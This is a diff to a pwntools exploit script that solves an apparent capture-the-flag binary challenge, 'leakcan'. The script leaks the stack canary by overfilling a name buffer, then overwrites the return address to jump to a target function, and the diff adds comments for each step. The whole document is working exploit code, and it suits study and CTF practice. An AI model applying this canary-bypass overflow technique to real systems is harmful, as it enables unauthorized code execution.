@@ -13,13 +13,20 @@ p = gdb.debug('./leakcan_chall', '''
 
 # p = remote('leakcan-25b8ac0dd7fd.tcp.1753ctf.com', 8435)
 
-p.recvuntil(b'What\'s your name?\n')
-p.sendline(b'A' * 0x58)
-p.recvuntil(b'Hello! ')
-canary_value = u64(b'\x00'+p.recv(0x60)[-7:])
-log.info(f'canary value: {hex(canary_value)}')
+GOAL_ADDR = 0x40194f
+FAKE_RBP = 0
 
-p.sendline(b'A'*0x58+p64(canary_value)+p64(1)+p64(0x40194f))
+# 1. fill the buffer before the canary
+p.recvuntil(b"What\'s your name?\n")
+p.sendline(b'A'*0x58)
+
+# 2. leak the canary value
+p.recvuntil(b"Hello! ")
+canary_value = u64(b'\x00'+p.recv(0x60)[-7:])
+log.info(f"canary value: {hex(canary_value)}")
+
+# 3. overwrite the return address
+p.sendline(b'A'*0x58+p64(canary_value)+p64(FAKE_RBP)+p64(GOAL_ADDR))
 
 p.interactive()
 
